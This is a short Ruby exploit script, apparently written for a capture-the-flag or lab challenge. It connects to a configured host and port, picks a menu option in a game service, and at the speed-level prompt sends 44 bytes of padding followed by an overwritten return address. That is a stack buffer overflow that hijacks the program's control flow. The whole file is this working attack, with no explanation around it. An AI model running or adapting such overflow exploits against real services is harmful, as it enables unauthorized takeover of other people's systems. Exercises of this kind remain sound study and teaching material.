require 'socket'
require './ipconfig.rb'

# need to fill in basic info in ipconfig.rb
hostname = HOSTNAME
port = PORT

# fill total 44 char
buf = ''
44.times { buf << 'a' }
# fill the return address
buf << "\x34\xb0\x04\x08"
buf << "\r\n"
puts buf

s = TCPSocket.open(hostname, port)
while line = s.gets
  # Read lines from the socket
  print line

  # send choice to start game
  # played not equal 0 means we have played once
  (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)
  # send speed setting
  (line.chop.eql? 'Choose the speed level(1-9):') && s.send(buf, 0)

end
s.close
